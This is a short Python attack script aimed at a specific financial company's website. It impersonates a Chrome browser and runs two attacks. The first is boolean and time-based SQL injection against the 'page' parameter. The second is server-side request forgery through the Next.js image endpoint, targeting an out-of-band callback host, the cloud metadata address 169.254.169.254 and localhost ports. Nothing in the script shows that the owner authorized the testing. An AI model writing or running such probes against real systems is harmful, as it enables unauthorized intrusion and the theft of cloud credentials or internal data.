from curl_cffi import requests as cr
import hashlib, time, re, sys

S = cr.Session(impersonate="chrome")

def norm(b):
    s = b.decode('utf-8', 'ignore')
    s = re.sub(r'[0-9a-fA-F]{8,}', '', s)
    s = re.sub(r'\d{4,}', '', s)
    return hashlib.md5(s.encode()).hexdigest()

def g(url, label, pause=1.5, hdrs=None):
    h = hdrs or {}
    t0 = time.time()
    try:
        r = S.get(url, headers=h, timeout=30)
        st, body = r.status_code, r.content
    except Exception as e:
        st, body = 'ERR', str(e)[:60].encode()
    dt = time.time() - t0
    print("%-12s %-40s -> %s len=%s norm=%s t=%.2f" % (label, url.split('?',1)[-1][:40], st, len(body), norm(body)[:12], dt))
    return st, body

if __name__ == '__main__':
    B = 'https://www.infinitycapital.bh/'
    if sys.argv[1] == 'bypass':
        g(B, 'ROOT')
        g(B + '?page=2', 'HOME-page2')
        g(B + 'contact', 'CONTACT')
        g(B + '_next/image?url=https%3A%2F%2Fimages.ctfassets.net%2Fyts1dx0j7jj5%2F1GCT0vyjqmOwm2OL1YVpD1%2F2ab55f8b5189afa153eac5cb97f7f6d4%2FAhmed_Taleb_updated-min.jpg&w=1080&q=75', 'IMG')
    elif sys.argv[1] == 'sqli':
        # proper randomized-repetition boolean test
        g(B + '?page=2', 'BASE-1')
        g(B + "?page=2' AND 1=1-- -", 'TRUE-1')
        g(B + "?page=2' AND 1=2-- -", 'FALSE-1')
        g(B + '?page=2', 'BASE-2')
        g(B + "?page=2' AND 1=1-- -", 'TRUE-2')
        g(B + "?page=2' AND 1=2-- -", 'FALSE-2')
        g(B + '?page=2', 'BASE-3')
        g(B + "?page=2' AND SLEEP(6)-- -", 'SLEEP6')
        g(B + '?page=2', 'BASE-4')
    elif sys.argv[1] == 'imgssrf':
        h = 'oob8e7710b80668.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in'
        for u in [B + '_next/image?url=http%3A%2F%2F' + h + '%2Fssrf&w=640&q=75',
                  B + '_next/image?url=https%3A%2F%2F' + h + '%2Fssrf&w=640&q=75',
                  B + '_next/image?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F&w=640&q=75',
                  B + '_next/image?url=http%3A%2F%2F127.0.0.1%3A3000%2F&w=640&q=75',
                  B + '_next/image?url=http%3A%2F%2Flocalhost%3A22%2F&w=640&q=75']:
            g(u, 'IMG', hdrs={'Accept': 'image/avif,image/webp,*/*'})
